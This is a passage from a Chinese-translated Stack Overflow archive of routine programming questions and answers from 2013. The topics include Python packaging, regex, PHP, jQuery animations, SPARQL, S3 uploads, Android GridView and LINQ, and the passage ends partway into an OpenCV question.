看起来没问题，但是包中没有带有这个“javascript”子文件夹的“静态”文件夹。我的“setup.py”的灵感来自具有类似结构的 github.com/maraujop/django-crispy-forms。关于上传此子文件夹有什么问题的任何提示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T01:28:32.620

您应该能够通过编辑`MANIFEST.in`文件以添加如下行来将这些文件添加到源代码分发中：

```
recursive-include someproject/static *.js 
```

要不就：

```
include someproject/static/javascript/*.js 
```

这足以让文件包含在源代码分发中。如果您使用的 setuptools`include_package_data`选项不足以安装文件，您可以要求在以下内容中明确安装它们`setup.py`：

```
package_data={'someproject': ['static/javascript/*.js']}, 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-02-03T11:57:39.060

使用以下

```
packages = ['.','templates','static','docs'],

package_data={'templates':['*'],'static':['*'],'docs':['*'],}, 
```

# regex - 有效电子邮件地址或有效字母数字检查的正则表达式

> ID：15650336
> 
> 赞同：1
> 
> 时间：2013-03-27T01:12:56.180
> 
> 标签：regex

嗨，我的 MVC 3 模型中有一个名为 UserName 的字段。此属性可以是有效的电子邮件地址，也可以是有效的 AlphaNumeric。我如何编写 Regex Express 来检查这两件事（有效的电子邮件或有效的字母数字）。

我正在使用的有效电子邮件表达式是

```
"^[_a-zA-Z0-9\'-]+(\.[_a-zA-Z0-9\'-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(name))$" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:36:38.133

假设您要匹配的字母数字字符串而不是电子邮件地址真的只是`A-Z`and `0-9`，您可以使用您已经拥有的...

```
^[_a-zA-Z0-9\'-]+(\.[_a-zA-Z0-9\'-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(name))$ 
```

...并用管道将其括在括号中以将其指示为可选组...

```
^([_a-zA-Z0-9\'-]+(\.[_a-zA-Z0-9\'-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(name))|[a-zA-Z0-9]+)$ 
```

这似乎是一个过于简单的解决方案，给出你迄今为止所做的工作，这让我想知道这是否有一些问题？？？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T03:20:44.623

如果你想要字母数字（必须包含单个字母和单个数字）试试这个

```
(?=[0-9a-zA-Z]*[a-zA-Z][0-9a-zA-Z]*)(?=[0-9a-zA-Z]*[0-9][0-9a-zA-Z]*)(^[0-9a-zA-Z]+$) 
```

# php - 如何使用 PHP 的模数根据两种不同的模式将 CSS 类添加到图像网格中？

> ID：15650337
> 
> 赞同：0
> 
> 时间：2013-03-27T01:13:11.170
> 
> 标签：php, css, media-queries, modulus

我想在两种不同的情况下使用模数将 CSS 类应用于图像网格：

**情况 1**
我想将 CSS 类应用于所有由 * 表示的中间图像。我不能简单地使用 nth-child，因为我不知道网格中是否总是有 9 个图像。有时可能有 5 个，有时是 7 个，有时是 8 个，等等……它是可变的。

```
[Img 1] [Img 2*] [Img 3] 
[Img 4] [Img 5*] [Img 6]
[Img 7] [Img 8*] [Img 9] 
```

**情况 2**
我想再次将 CSS 类应用到由 * 指示的网格中的图像。出于与上述相同的原因，我也不能使用 nth-child 。我将通过媒体查询将 CSS 属性添加到在这种情况下给出的类中，因为站点的宽度较小，因此有两列图像。

```
[Img 1] [Img 2*]
[Img 3] [Img 4*] 
```

**到目前为止我的代码**

```
if ($counter % 3 == 1) {
    $situation1 = TRUE;
} 
if ($counter % 3 == 0) {
    $situation2 = TRUE;
} 
$counter++;

<div <?php if($situation1) { post_class('situation1'); } if($situation2) { post_class('situation2'); }><img src="" /></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:37:58.310

模数是第一个操作数除以第二个操作数的余数，因此在您的情况下，您需要：

```
if ($counter % 3 === 2) {
    $situation1 = TRUE;
} 
if ($counter % 2 === 0) {
    $situation2 = TRUE;
} 
```

您可以将其重写为：

```
$situation1 = ($counter % 3 === 2);
$situation2 = ($counter % 2 === 0); 
```

**但是**，您可以使用`nth-child`选择器 (IE9+) 在 css 中执行相同操作：

情况一：

```
:nth-child(3n+2) 
```

情况2：

```
:nth-child(2n+2) 
```

# android - Marker Augmented Reality for android with framework Pro Android Augmented Reality

> ID：15650339
> 
> 赞同：2
> 
> 时间：2013-03-27T01:13:16.140
> 
> 标签：android, augmented-reality, marker

我使用框架 Pro Android 增强现实第 8 章创建 AR 应用程序此链接[https://github.com/RaghavSood/ProAndroidAugmentedReality](https://github.com/RaghavSood/ProAndroidAugmentedReality)

我想创建一个不是黑白的标记。如何创建不是黑白的标记？或示例代码？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T01:16:56.747

（我是这本书的作者，也是它使用的框架的开发者）

AndAR 支持开箱即用的彩色标记，您无需执行任何特殊操作即可使用它们。只需像黑白的一样插入它们。

您可以使用在线 Flash 工具和网络摄像头从[此处](http://flash.tarotaro.org/ar/MarkerGeneratorOnline.swf)生成自己的标记。

请记住，您的颜色应该是高对比度的，以便检测具有良好的准确性。使用相似的颜色会降低检测精度。

# sparql - 如何从 DBpedia 获取英国和英格兰的关系？

> ID：15650341
> 
> 赞同：2
> 
> 时间：2013-03-27T01:13:47.590
> 
> 标签：sparql, dbpedia

我正在尝试编写一个 SPARQL 查询来获取英国和英格兰之间的关系，但没有成功：没有返回结果，如您[在此处](http://dbpedia.org/snorql/?query=SELECT%20?property%20%20%0D%0AWHERE%20%7B%0D%0A%20%20%3Chttp://dbpedia.org/resource/England%3E%20?property%20%3Chttp://dbpedia.org/resource/United_Kingdom%3E%0D%0A%7D)看到的：

```
SELECT ?property  
WHERE {
  <http://dbpedia.org/resource/England> ?property <http://dbpedia.org/resource/United_Kingdom>
} 
```

有什么建议吗？SPARQL 查询之间是否有任何错误？我如何通过 DBpedia 找到英格兰在英国？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T07:59:53.043

您的查询是正确的。如果没有结果，就没有这种关系。

DBpedia 源自 Wikipedia 上可用的结构化数据。[http://en.wikipedia.org/wiki/England](http://en.wikipedia.org/wiki/England)在右侧的信息框中没有显示将英格兰与英国联系起来的财产。如果您在浏览器中查找资源，例如[http://dbpedia.org/resource/England](http://dbpedia.org/resource/England)，您将获得有关该资源的所有已知信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-11T19:05:14.450

关于 DBPedia 的英格兰和英国之间关系的具体问题，最好反过来看：

```
SELECT *
WHERE { 
{ 
   <http://dbpedia.org/resource/United_Kingdom> ?property <http://dbpedia.org/resource/England>
} 
```

...并发现 ?property 绑定到 rdfs:seeAlso。

`Category:`DBPedia中也有资源，它们使用基于 SKOS 的更广泛和更窄的关系，例如参见：

```
SELECT ?property ?object 
WHERE {
   <http://dbpedia.org/resource/Category:England> ?property ?object .
} 
```

# javascript - 每次请求变量时修改对象的原型以将日志记录到控制台

> ID：15650343
> 
> 赞同：0
> 
> 时间：2013-03-27T01:14:10.033
> 
> 标签：javascript

我敢肯定我以前在某个地方见过这个。我刚开始看原型，所以我不太了解。

什么是正确的原型声明，以便捕获所有对变量的请求？myObject 是具有更改原型的对象。

“myObject.x”会被该函数捕获，然后我会在其中记录有一个调用试图访问“x”并根据调用的内容返回 x（不是很重要）。

（x 可以是任何有效的变量名） 编辑：所以 'myObject.foo' 会给出 'foo' 的控制台输出，而 'myObject.bar' 会返回 'bar'

我已经在一个脚本中看到过这种情况，其中变量在返回之前已更改，但我记不起它来再次找到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:20:19.097

您可以创建`x`一个方法（而不是属性），在子类中覆盖它（添加您的日志记录调用），然后用于`prototype.x.call`调用超级方法。

```
var Foo = function () {
    this.x = function () {
        console.log('ancestor x');
    }
}

var Bar = function () {
    this.x = function () {
        console.log('inherited x');
        Bar.prototype.x.call(this);
    }
}

Bar.prototype = new Foo;

new Bar().x(); 
```

否则，有一些供应商扩展和 ES5/6 getter 方法，但您将不得不应对这些选项中任何一个的不稳定浏览器支持。

[小提琴](http://jsfiddle.net/ethagnawl/3c7rW/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:45:31.997

> 什么是正确的原型声明，以便捕获所有对变量的请求？myObject 是具有更改原型的对象。

这与 JavaScript 的原型继承并没有真正的关系。可以通过`new`在构造函数上使用关键字及其`prototype`属性来创建具有原型的对象，或者通过`Object.create`. 您感兴趣的是如何构造一个对象，每个属性都可以访问......</p>

> 会被函数捕获

不幸的是，当前的 JavaScript 无法做到这一点。您只能设置具有特定名称的属性（使用值，或使用 getter/setter），目前还没有实现包罗万象的行为 - 尽管一些引擎支持该`Proxy`草案。为此，请参阅[属性是否具有等效的 __noSuchMethod__ 功能，或者在 JS 中实现它的方法？](https://stackoverflow.com/q/2266789/1048572)，[带有默认值的Javascript数组（相当于Python的defaultdict）？](https://stackoverflow.com/q/13059837/1048572)或[在读取之前设置未定义的 javascript 属性](https://stackoverflow.com/q/11503666/1048572)。

* * *

我认为这最接近您想要的 - 使用显式 getter 函数而不是属性：

```
function Entity() {
   this.data = {position_X:5, foo:"bar", …};
}
Entity.prototype.get = function (name) {
    console.log("access on "+name);
    return this.data[name];
};

var entity = new Entity;
entity.get("x"); // undefined, but logs "access on x"
entity.get("position_X"); // 5, and logs "access on position_X"
entity.get("foo"); // "bar", and logs "access on foo" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:25:24.807

您正在寻找[getter/setter](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Working_with_Objects#Defining_getters_and_setters)：

```
foo = {};
var x;
Object.defineProperty(foo, 'x', {
    get: function () {
        console.log("Getting:",x);
        return x; // or not..
    },
    set: function (val) {
        console.log("Setting to:", val);
        x = val;
        return x;
    }
}); 
```

当然，这些不适用于旧版浏览器。

编辑：我已经为这种事情创建了 Waject：[https ://github.com/spn/Waject](https://github.com/s-p-n/Waject)

# amazon-s3 - 我可以通过 ajax 将 jquery 文件上传到亚马逊 s3 吗？

> ID：15650346
> 
> 赞同：3
> 
> 时间：2013-03-27T01:14:15.563
> 
> 标签：amazon-s3, jquery-file-upload

所以，我试图让 jquery 文件上传与亚马逊 s3 一起工作。

实际上，上传工作正常。文件上传非常好。但是，问题是，在请求结束时，我收到以下错误。这是在Firefox中。

```
XML Parsing Error: no element found Location: moz-nullprincipal:{230dddca-13b5-4268-a9d4-4f4dcbbc8a0e} Line Number 1, Column 1: 
```

我在 chrome 中根本没有收到错误。有没有人遇到过这种情况，如果有，你有没有补救过？

亚马逊 s3 CORS 设置

```
<?xml version="1.0" encoding="UTF-8"?>
<CORSConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <CORSRule>
    <AllowedOrigin>*</AllowedOrigin>
    <AllowedMethod>GET</AllowedMethod>
    <AllowedMethod>POST</AllowedMethod>
    <AllowedMethod>PUT</AllowedMethod>
    <AllowedHeader>*</AllowedHeader>
  </CORSRule>
</CORSConfiguration> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-21T14:57:36.153

好的，我不确定您正在编写哪种语言的后端。但是，我通过包含一个名为“success_action_status”的属性并将其设置为策略中的字符串“201”来解决此问题。我还必须在到 S3 的 XHR 上传表单中包含相同的参数。

您可以在此处阅读有关有效属性的信息：http: [//docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectPOST.html](http://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectPOST.html)

但是，它说设置默认值应该只返回一个应该完全有效的空白响应。我认为 Firefox 期待 XML 响应（带有 Firefox 的错误？），但收到一个无法解析的空文档。将“success_action_status”设置为“201”，返回一个准备解析的 XML 文档。

希望这可以帮助！

贾斯汀

**注意**：确保您的“201”在被编码到您的策略时确实是一个字符串。我遇到了一个 PHP 问题，它将值默认为整数，然后导致另一个亚马逊错误返回 403。

# solr - Solr 上的查询变慢。我有哪些选择？

> ID：15650347
> 
> 赞同：0
> 
> 时间：2013-03-27T01:14:16.160
> 
> 标签：solr, lucene, full-text-search, search-engine, solr4

我在服务器上运行单个 Solr 实例。此实例中的文档数量已达到查询变慢的程度。我有哪些选择？

# python - 根据另一个列表的值顺序对字典列表进行排序

> ID：15650348
> 
> 赞同：10
> 
> 时间：2013-03-27T01:14:16.843
> 
> 标签：python, sorting, python-2.7

我正在使用 python 2.7.3，我正在尝试根据另一个列表的值的顺序对字典列表进行排序。

IE：

```
listOne = ['hazel', 'blue', 'green', 'brown']
listTwo = [{'name': 'Steve', 'eyecolor': 'hazel', 'height': '5 ft. 11 inches'},
           {'name': 'Mark', 'eyecolor': 'brown', 'height': '6 ft. 2 inches'},
           {'name': 'Mike', 'eyecolor': 'blue', 'height': '6 ft. 0 inches'},
           {'name': 'Ryan', 'eyecolor': 'brown', 'height': '6 ft, 0 inches'},
           {'name': 'Amy', 'eyecolor': 'green', 'height': '5 ft, 6 inches'}] 
```

根据 listOne 中值的顺序对 listTwo 进行排序，我们将得到以下结果：

```
print listTwo
[{'name': 'Steve', 'eyecolor': 'hazel', 'height': '5 ft. 11 inches'},
{'name': 'Mike', 'eyecolor': 'blue', 'height': '6 ft. 0 inches'},
{'name': 'Amy', 'eyecolor': 'green', 'height': '5 ft, 6 inches'},
{'name': 'Mark', 'eyecolor': 'brown', 'height': '6 ft. 2 inches'},
{'name': 'Ryan', 'eyecolor': 'brown', 'height': '6 ft, 0 inches'}] 
```

我最终需要输出此文本，因此我为正确显示它（以正确的顺序）所做的工作如下：

```
for x in xrange(len(listOne)):
    for y in xrange(len(listTwo)):
        if listOne[x] == listTwo[y]["eyecolor"]:
            print "Name: " + str(listTwo[y]["name"]),
            print "Eye Color: " + str(listTwo[y]["eyecolor"]),
            print "Height: " + str(listTwo[y]["height"]) 
```

是否有某种 lambda 表达式可以用来实现这一点？必须有一种更紧凑、更简单的方法来按我想要的顺序获取它。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-27T01:39:06.117

最简单的方法是使用`list.index`为您的字典列表生成排序值：

```
listTwo.sort(key=lambda x: listOne.index(x["eyecolor"])) 
```

虽然这有点低效，因为`list.index`通过眼睛颜色列表进行线性搜索。如果你有很多眼睛颜色要检查，它会很慢。一种更好的方法是构建一个索引字典：

```
order_dict = {color: index for index, color in enumerate(listOne)}
listTwo.sort(key=lambda x: order_dict[x["eyecolor"]]) 
```

如果不想修改`listTwo`，可以使用内置`sorted`函数代替`list.sort`方法。它返回列表的排序副本，而不是就地排序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-11-22T11:28:39.443

```
listOne = ['hazel', 'blue', 'green', 'brown']
listTwo = [{'name': 'Steve', 'eyecolor': 'hazel', 'height': '5 ft. 11 inches'},{'name': 'Mark', 'eyecolor': 'brown', 'height': '6 ft. 2 inches'},{'name': 'Mike', 'eyecolor': 'blue', 'height': '6 ft. 0 inches'},{'name': 'Ryan', 'eyecolor': 'brown', 'height': '6 ft, 0 inches'},{'name': 'Amy', 'eyecolor': 'green', 'height': '5 ft, 6 inches'}]

order_list_dict = {color: index for index, color in enumerate(listOne)}

print(order_list_dict)

print(sorted(listTwo, key=lambda i: order_list_dict[i["eyecolor"]])) 
```

# c# - 如何将我的 LINQ 查询转换为使用 lambda 语法，这样做有什么好处吗？

> ID：15650349
> 
> 赞同：0
> 
> 时间：2013-03-27T01:14:18.907
> 
> 标签：c#, linq

我有一个简单的方法：

```
 private IList<Objective> createObjectives()
    {

        var objectiveNames = new[]
        {
            "Objective 1",
            "Objective 2",
            "Objective 3",
            "Objective 4",
            "Objective 5",
            "Objective 6",
            "Objective 7",
            "Objective 8"
        };
        var objectives = from objectiveName in objectiveNames
                         select new Objective
                         {
                             Name = objectiveName,
                             Description = objectiveName + " Description",
                             ModifiedDate = DateTime.Now
                         };
        return objectives.ToList();
    } 
```

这是我可以转换为使用 lambdas 的东西吗？这样做有什么好处吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:20:21.143

```
objectiveNames.Select(o => new Objective
                         {
                             Name = o,
                             Description = o + " Description",
                             ModifiedDate = DateTime.Now
                         }).ToList(); 
```

很难说有什么优势，但我更喜欢 Lambdas，因为我不想在程序中出现类似 sql 的编码。

# lotus-notes - Lotus Notes 显示文档在视图中具有 V2 样式的附件

> ID：15650353
> 
> 赞同：0
> 
> 时间：2013-03-27T01:14:41.720
> 
> 标签：lotus-notes, lotus

我的 Lotus Notes 客户端是 R6.5

**我有 V2-Style Attachment 问题**

我想在视图中显示那些包含 V2 样式附件的文档。

但我不知道如何编写这个视图选择公式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T03:11:21.737

我不认为这是可以做到的。您需要将@Attachments 与文档中富文本字段中的附件引用数量进行比较，但无法以公式语言获得。

另一种方法是使用文件夹而不是视图，并编写 LotusScript 或 Java 代理来比较 NotesRichTextItem.EmbeddedObjects 数组与从 Evaluate("@Attachments") 获得的数组。如果您发现任何未在富文本中引用的附件，您将使用 NotesDocument.PutInFolder。

# python - 检查 csv 的 X 行的任何部分是否在以下 8 行中的任何一个中。如果是，则移动 X 行。

> ID：15650356
> 
> 赞同：0
> 
> 时间：2013-03-27T01:14:45.293
> 
> 标签：python, csv

我的程序随机化了 csv 文件中的行。有 120 行，5 列。前两列各包含一个图像的名称。大约有 30 个（2 列*120 行=240）个图像名称重复，每个重复一次。图像名称的重复（第二个副本）不一定与第一个在同一列中（它可能在第 1 列或第 2 列中），但它可能是。

我需要让程序检查每行（第 1 列和第 2 列）中的 2 个图像中的每一个是否也在以下 8 行之一中。如果是，我需要它将具有图像的第二个实例的行移动到文件的末尾。然后我需要它再次检查（因为一些图像重复两次），如果它发现另一个重复，我需要它把第二个重复行放在文件的其他地方。不在乎在哪里，只要它不在目标行（正在测试的行）的 7 行内。

# jquery - jQuery - 防止相同的点击功能一次运行多次

> ID：15650357
> 
> 赞同：3
> 
> 时间：2013-03-27T01:14:58.330
> 
> 标签：jquery

我今天刚开始学习 JavaScript 和 jQuery，遇到了第一个问题，这让我非常头疼。我一直在寻找几个小时来解决这个问题，但没有一个解决方案奏效。

我的问题是：我制作了一个“轮播”网站，如果单击菜单链接，内容会向左或向右滑动。

一切正常，但是如果您在单击功能的动画完成之前再次单击另一个菜单链接，则内容会滑开并且不在正确的位置。

我已经尝试过 promise().done()、flags、callback 等等，但对我没有任何效果:(也许我做错了..

我正在寻找一种解决方案，阻止这个点击功能直到它完成，或者更好地制作这个功能的队列，以便在另一个之后运行，但不是同时运行。

这是我的 JS 代码，我知道它并不完美，可以更好地解决，但就像我说的，我今天才开始学习这些东西，我还不熟悉语法等等。

```
 var gotoPage = function(pos) {

    if(pos == 'home') {
        $('li#home').css({"opacity" : 1});
        $('li#home').css({"left" : "1700px"});
        $('li#home').animate({"left" : "0px"}, speed, 'easeInOutQuint');

        $('li#news').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#news').animate({"opacity" : 0}, 0);
        $('li#galery').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#galery').animate({"opacity" : 0}, 0);
    } else if (pos == 'news') {
        $('li#news').css({"opacity" : 1});
        $('li#news').css({"left" : "1700px"});
        $('li#news').animate({"left" : "0px"}, speed, 'easeInOutQuint');

        $('li#home').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#home').animate({"opacity" : 0}, 0);
        $('li#galery').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#galery').animate({"opacity" : 0}, 0);
    } else if (pos == 'galery') {
        $('li#galery').css({"opacity" : 1});
        $('li#galery').css({"left" : "1700px"});
        $('li#galery').animate({"left" : "0px"}, speed, 'easeInOutQuint');

        $('li#news').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#news').animate({"opacity" : 0}, 0);
        $('li#home').animate({"left" : "-1700px"}, speed, 'easeInOutQuint');
        $('li#home').animate({"opacity" : 0}, 0);
    }

}

$(document).ready(function(){

    hideAll();
    autoSelect();

    $('#home').click(function(){        
        gotoPage(posHome);
    });

    $('#news').click(function(){
        gotoPage(posNews);
    });

    $('#galery').click(function(){      
        gotoPage(posGalery);
    });

}); 
```

你能帮我么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:33:36.697

您可能会考虑一些稍微不同的东西 - 即允许点击三个元素中的任何一个来“劫持”先前不完整点击动作的进度。

```
$(document).ready(function() {
    var $currentePage = null;

    var gotoPage = function(pos) {
        if($currentePage) {
            $currentePage.stop().animate({'left' : '-1700px'}, speed, 'easeInOutQuint').css('opacity', 0);
        }
        $currentePage = $('li#' + pos).css({
            'opacity' : 1,
            'left' : '1700px'
        }).animate({'left' : '0px'}, speed, 'easeInOutQuint');
    }

    hideAll();
    autoSelect();

    $('#home, #news, #galery').click(function() {
        gotoPage(this.id);
    });
    $('#home').trigger('click');
}); 
```

如您所见，`gotoPage()`大大减少了，工作方式如下：

*   杀死当前正在运行的任何动画
*   将当前元素返回到其静止状态
*   将请求的元素设置为活动状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:22:42.287

BradGreens 的答案看起来最正确。

这是一个有趣的选择：

您可以使用“currentAnimating”布尔值来判断动画是否仍在执行。然后在动画完成时，将其设置为 false；

```
var animating = false

if(pos == 'home' && !animating) {
    animating = true;
    $('li#galery').animate({"opacity" : 0}, 100,  function() {
        // Animation complete.
        animating = false;
    }););
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:20:33.097

未经测试，但您正在寻找这个 -

```
$('#home').click(function(){  
    if( $(this).is(':animated') ) return;
    gotoPage(posHome);
});

$('#news').click(function(){
    if( $(this).is(':animated') ) return;
    gotoPage(posNews);
});

$('#galery').click(function(){     
    if( $(this).is(':animated') ) return;
    gotoPage(posGalery);
}); 
```

[请参阅此处以测试动画](http://api.jquery.com/animated-selector/)的 jQuery 选择

# android - 每个单元格中同时包含图像和文本的 Gridview - OnClickListener ClassCastException 错误

> ID：15650361
> 
> 赞同：0
> 
> 时间：2013-03-27T01:15:43.927
> 
> 标签：android, gridview

我正在使用一个网格视图，其中每个单元格都包含一个图像和一行文本。我想做的是当用户在gridview中选择该项目时更改图像。当只有没有文本的图像时，我有这个工作，但是在更改单元格以包含图像和文本时，我收到错误：

```
java.lang.ClassCastException: android.widget.LinearLayout 
```

错误发生在我试图获取所选项目的图像视图的行上。

```
ImageView ivCheck = (ImageView)parent.getChildAt(position); 
```

据我了解，这是因为我目前正在做的无法将 textview 与 imageview 分开......但是，我不确定有什么方法可以做到这一点。

下面的代码：

网格.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<GridView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/grid"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:padding="10dp"
    android:verticalSpacing="10dp"
    android:horizontalSpacing="10dp"
    android:numColumns="2"
    android:columnWidth="90dp"
    android:stretchMode="columnWidth"
    android:gravity="center" >
</GridView> 
```

图标.xml：

```
<LinearLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/widget44"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:orientation="vertical"
android:layout_x="201px"
android:layout_y="165px"
android:gravity="center_horizontal">

<ImageView
android:id="@+id/icon_image"
android:layout_width="wrap_content"
android:layout_height="wrap_content">
</ImageView>

<TextView
android:id="@+id/icon_text"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:text="TextView"
android:gravity="center_horizontal"
android:textColorHighlight="#656565">
</TextView>
</LinearLayout> 
```

相关java代码：

```
gridview.setAdapter(new ImageAdapter(this));
gridview.setOnItemClickListener(new OnItemClickListener() {
    public void onItemClick(AdapterView<?> parent, View v, int position, long id) {
    //Setting tags, and resetting after failed match
    System.out.println(parent + ", " + v + ", " + position + ", " + id);
    for (int i = 0; i < tiles.length; i++){
        ImageView ivCheck = (ImageView)parent.getChildAt(i); //error here 
```

我已经阅读了许多关于使用图像和文本制作网格视图的教程，但是很难找到一个带有 onclicklistener 的教程，它会改变所选单元格中的图像。我真的很感激任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:29:54.343

只需使用`View v`参数访问您要修改的视图。

像这样：

```
LinearLayout icon = (LinearLayout)v;
ImageView image = icon.findViewById(R.id.icon_image);
// do stuff with image here 
```

请注意，如果用户滚动离开此项目，您所做的更改将不会被保存！这是因为 GridView 会`View`在它因滚动而离开屏幕时回收它。如果您想允许用户修改 中的项目`GridView`并记住它，即使他们滚动离开并返回，您将需要更改`Adapter`填充 this 的`GridView`。

# php - 一种形式的多个 id

> ID：15650362
> 
> 赞同：2
> 
> 时间：2013-03-27T01:15:53.163
> 
> 标签：php, mysql

我真的不知道如何解释我想要什么，但我会尝试。我知道我的代码很糟糕而且一团糟，我真的很糟糕：/任何帮助将不胜感激。

我正在为我的游戏制作商店，并且有一个数据库，其中列出了商店中口袋妖怪的口袋妖怪/价格/类型/ID。现在我几乎可以使用它了，它显示了商店中的所有口袋妖怪，它们下面都有一个购买按钮，但出于某种原因，无论你尝试购买什么口袋妖怪，它只会购买列表顶部的那个。我希望我解释得足够好，这是我的代码。

```
if ($_POST['A'] == '1' ) {
    $token= mysql_real_escape_string($_POST['token']);
    $tokenn = strip_tags($token);

    $sql234 = "SELECT * FROM ticketshop";
    $result2 = mysql_query("SELECT * FROM ticketshop");
    while($row2 = mysql_fetch_array($result2)) {
        $sql23 = "SELECT * FROM users WHERE username='".$_SESSION['username']."')";
        $result = mysql_query("SELECT * FROM users WHERE username='".$_SESSION['username']."'");
        while($row = mysql_fetch_array($result)){
            echo "You have ".$row['ticket']." Tickets" ;
            echo "<p></p>" ;
            if (isset($_POST['slot1'])) {
                if ($row['ticket'] >= $row2['price']) {
                    echo "You have bought ".$row2['pokemon']."" ;
                    mysql_query("UPDATE users SET ticket=ticket-".$row2['price']." WHERE username='".$_SESSION['username']."'") 
                        or die(mysql_error());

                    mysql_query("INSERT INTO user_pokemon 
            (pokemon, belongsto, exp, time_stamp, slot, level, type) VALUES ('".$row2['pokemon']."','".$_SESSION['username']."', 100,'".time()."','0', '5', '".$row2['type']."' )") 
                        or die(mysql_error());  
                } else {
                    echo "You can't afford ".$row2['pokemon']."";
                }
            }
        }
    }
}
?>

<?php
    $result = mysql_query("SELECT * FROM ticketshop");
    while($row = mysql_fetch_array($result))
    {   
        $sql2 = "SELECT * FROM pokemon WHERE name='".$row['pokemon']."'";
        $result2 = mysql_query($sql2) or die(mysql_error());
        $battle_get2 = mysql_fetch_array($result2);

        echo '<img src="pokemon/'.$row['type'] .''.$battle_get2['pic'].'" border=0>
        </a>' ; 

        $idd= mysql_real_escape_string($row2['id']);
        $iddd = strip_tags($idd);
?>

</span>
<form name="slot1" action="" method="post">
  <div align="center">
    <p>
      <span>
        <select name="A" id="" >
          <option value="1">Buy</option>
        </select>
        <input type="hidden" name="token" id="token" value="<?php  echo $iddd ;  ?>" />
        <br />
        <input type="submit" class="submit" value="Accept" name="slot1">
        </span></p>
    </div>
</form>
<span>

<?php
        echo $row ['pokemon'];

?>

</span>
<p></p>
<span>

<?php
        echo "type:";
        echo $row ['type'];
?>

</span>
<p></p>
<span>

<?php
        echo "price:";
        echo $row['price'];
        echo "<br />";
    }
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-06T09:31:53.510

```
Below you are doing wrong:

$sql234 = "SELECT * FROM ticketshop";
$result2 = mysql_query("SELECT * FROM ticketshop");

here you are not adding any conditions for fetching the particular record, please see corrections below:

$sql234 = "SELECT * FROM ticketshop where <<FIELD NAME>> = '".$token."'";
$result2 = mysql_query($sql234); 
```

# model-view-controller - AngularJS：多个视图的“全局”菜单按钮

> ID：15650364
> 
> 赞同：0
> 
> 时间：2013-03-27T01:16:03.427
> 
> 标签：model-view-controller, angularjs

我（非常）最近潜入了 Angular，但我在如何设计我的布局方面有点挣扎。

对于我的网站，我创建了一个包含输入字段和一些按钮的菜单。这个想法是输入字段与任一按钮组合应该服务于一个功能。所以说对于 viewA，输入字段应该只充当搜索栏。但是，如果用户单击其中一个按钮，则应使用输入字段值作为在另一个 viewB 中创建新项目的基础。

搜索功能非常适合 viewA，但我无法让按钮切换视图。我怀疑（或知道，但不知道如何解决）这是因为提到的按钮在视图之外（ng-view），因此没有控制器。

我搜索了“多个控制器/视图”，其中的建议因使用包含功能或创建服务而异。问题是我不知道什么是最佳实践，或者对于我的案例是否有必要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:31:54.373

菜单+输入字段是另一个视图。它应该有自己的控制器。根据路由 –`$on($routeChangeSuccess, ...)`您可以使用[ng-switch](http://docs.angularjs.org/api/ng.directive:ngSwitch)在该视图中适当的 HTML/模板之间切换。如果您的模板很大，您可以在 ng-switch 指令中使用 ng-include。否则不要打扰，只需在每个 ng-switch-when 中嵌入 HTML。

有关如何使用 $routeChangeSuccess（但不是 ng-switch）的示例，请参阅[https://stackoverflow.com/a/11910904/215945](https://stackoverflow.com/a/11910904/215945)

# android - 匹配器断言失败错误opencv Android

> ID：15650371
> 
> 赞同：17
> 
> 时间：2013-03-27T01:17:23.713
> 
> 标签：android, opencv, image-processing

我正在编写代码以从相机预览中的可绘制对象中找到类似的对象。我正在使用最新的 Opencv 2.4.4。

以下是我的函数和 logcat 的输出。我做错了什么，我得到这样的输出？

```
 public void detect_image (Mat mRgba) {

    object_desc = new Mat();
    scene_desc = new Mat();

    object_keys = new MatOfKeyPoint();
    scene_keys = new MatOfKeyPoint();

    matches = new MatOfDMatch();
